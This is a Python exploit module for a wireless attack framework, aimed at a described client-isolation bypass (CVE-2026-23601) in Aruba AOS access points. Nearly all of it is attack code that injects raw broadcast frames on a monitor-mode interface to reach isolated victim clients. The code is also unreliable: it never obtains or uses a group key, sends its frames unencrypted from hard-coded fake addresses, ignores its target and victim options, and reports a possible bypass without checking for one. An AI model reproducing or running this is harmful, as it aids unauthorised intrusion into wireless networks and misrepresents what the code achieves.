# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Aruba AOS-8/AOS-10 Client Isolation Bypass via GTK Manipulation (CVE-2026-23601).

    Aruba AOS-8 and AOS-10 access points contain a vulnerability in the
    client isolation enforcement mechanism.  By manipulating the Group
    Temporal Key (GTK) rekeying process, an authenticated wireless client
    can bypass client isolation and communicate directly with other clients
    on the same SSID.  The attack exploits the timing window during GTK
    rotation where the old and new keys coexist, allowing an attacker to
    inject frames using the outgoing GTK before isolation rules are
    re-applied.

    CVSS v3.1: 5.4 (Medium), AV:A/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Aruba AOS Client Isolation Bypass via GTK Manipulation (CVE-2026-23601)",
        "description": (
            "Exploits CVE-2026-23601 in AOS-8 and AOS-10.  During GTK "
            "rekeying, the access point briefly accepts frames encrypted "
            "with the outgoing GTK before isolation rules are re-applied. "
            "An authenticated attacker can inject broadcast/multicast "
            "frames during this window to communicate with other isolated "
            "clients on the same SSID."
        ),
        "authors": (
            "HPE Aruba Security Advisory",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-23601",
            "https://www.arubanetworks.com/assets/alert/",
        ),
        "disclosure_date": "2026-06-01",
        "platform": "aruba_aos",
        "arch": "all",
        "privileged": False,
        "targets": (
            "AOS-8 before 8.12.0.5",
            "AOS-10 before 10.6.0.4",
        ),
    }

    target = OptIP("", "Target AP BSSID or IP for monitoring")
    port = OptPort(1, "Not used (WiFi frame injection)")
    timeout = OptFloat(10.0, "GTK rekey monitoring timeout")
    interface = OptString("wlan0mon", "Monitor-mode wireless interface")
    victim_mac = OptString("", "Victim client MAC to reach after bypass")

    _FRAME_TYPE_DATA = 0x02
    _SUBTYPE_QOS_DATA = 0x08
    _BROADCAST = b"\xff\xff\xff\xff\xff\xff"

    def _build_radiotap_header(self) -> bytes:
        return struct.pack("<BBHI", 0, 0, 8, 0)

    def _build_frame_control(self, frame_type: int, subtype: int, flags: int = 0) -> bytes:
        fc_low = (frame_type & 0x03) | ((subtype & 0x0F) << 4)
        fc_high = flags & 0xFF
        return struct.pack("<BB", fc_low, fc_high)

    def _build_gtk_probe_frame(self, bssid: bytes, src: bytes) -> bytes:
        """Build a broadcast data frame to test client isolation bypass.

        This frame is injected during the GTK rekeying window when
        the AP momentarily accepts frames under the old GTK before
        re-applying isolation rules.
        """
        fc = self._build_frame_control(self._FRAME_TYPE_DATA, self._SUBTYPE_QOS_DATA, 0x01)
        duration = struct.pack("<H", 0)
        dst = self._BROADCAST
        seq_ctrl = struct.pack("<H", 0)
        qos_ctrl = struct.pack("<H", 0)

        header = fc + duration + dst + bssid + src + seq_ctrl + qos_ctrl
        payload = b"GTK_BYPASS_PROBE" + struct.pack("<I", int(time.time()))

        radiotap = self._build_radiotap_header()
        return radiotap + header + payload

    def _open_raw_wifi(self) -> socket.socket | None:
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            sock.settimeout(self.timeout)
            sock.bind((str(self.interface), 0))
            return sock
        except OSError:
            return None

    @mute
    def check(self) -> bool:
        """Verify monitor-mode interface is available."""
        raw = self._open_raw_wifi()
        if raw is None:
            return False
        raw.close()
        return True

    def run(self) -> None:
        if not self.interface:
            print_error("interface is required (e.g. wlan0mon)")
            return

        if not self.check():
            print_error(
                f"Cannot open raw socket on {self.interface}. "
                "Ensure monitor mode is enabled."
            )
            return

        print_success("Monitor interface ready; waiting for GTK rekey window")
        self._exploit()

    def _exploit(self) -> None:
        raw = self._open_raw_wifi()
        if raw is None:
            print_error("Failed to open raw socket")
            return

        fake_bssid = b"\x02\x00\x00\x00\x00\x01"
        fake_src = b"\x02\x00\x00\x00\x00\x02"

        probe_frame = self._build_gtk_probe_frame(fake_bssid, fake_src)

        print_status("Injecting broadcast probe frames during GTK rekey window")
        print_status(f"Monitoring for {self.timeout}s, injecting every 100ms")

        start = time.time()
        injected = 0
        while time.time() - start < self.timeout:
            try:
                raw.send(probe_frame)
                injected += 1
            except OSError:
                pass
            time.sleep(0.1)

        raw.close()

        print_status(f"Injected {injected} broadcast probe frames")
        print_info(
            "If the AP is vulnerable and GTK rekeying occurred during "
            "the injection window, client isolation was bypassed. "
            "Verify by checking if the victim client received the "
            "broadcast probes despite isolation being enabled."
        )
